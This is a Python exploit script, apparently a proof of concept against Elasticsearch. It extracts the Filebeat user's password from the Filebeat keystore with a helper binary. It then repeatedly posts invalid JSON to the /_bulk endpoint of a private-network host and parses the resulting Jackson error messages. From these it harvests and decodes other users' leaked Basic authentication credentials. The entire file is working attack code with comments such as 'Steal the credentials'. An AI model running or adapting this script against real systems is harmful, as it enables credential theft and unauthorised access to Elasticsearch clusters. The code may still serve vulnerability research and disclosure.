#!/usr/bin/python3.10

import requests
import json
import re
import base64
import subprocess
import time

# Wait in order to let filebeat finish uploading its logs
time.sleep(60*6)

# Steal the credentials from the keystore
result = subprocess.run(['./keystore-extractor/keystore-extractor', '/var/lib/filebeat/filebeat.keystore'], stdout=subprocess.PIPE)
password = re.search(r"ES_PWD : (.+)\n",result.stdout.decode('utf-8')).group(1)

authorization_header = b"Basic " + base64.b64encode(f"filebeat_user:{password}".encode("utf-8"))

# This is invalid JSON, causing an error message in Jackson
payload = "ExploitTime\n"
vulnerable_endpoint = "/_bulk"
url = "http://192.168.56.10:9200" + vulnerable_endpoint

credential_list = set()

# Exploit and parse found credentials!
for _ in range(6):
    try:
        r = requests.post(url, data = payload, headers={"content-type":"application/json", "Authorization":authorization_header}, verify=False)

        response = json.loads(r.content)

        leak1 = response["error"]["root_cause"][0]["reason"].split("(byte[])\"")[1].split("; line")[0]
        leak2 = response["error"]["reason"].split("(byte[])\"")[1].split("; line")[0]

        found_creds = re.search(r"Basic ((?:[A-Za-z0-9+\/]{4})*(?:[A-Za-z0-9+\/]{4}|[A-Za-z0-9+\/]{3}=|[A-Za-z0-9+\/]{2}={2}))", leak1+leak2)
        if found_creds:
            credentials =  base64.b64decode(found_creds.group(1)).decode('utf-8')
            if not credentials in credential_list:
                credential_list.add(credentials)
                print("Found credentials:", credentials)
    except:
        pass

    time.sleep(60)
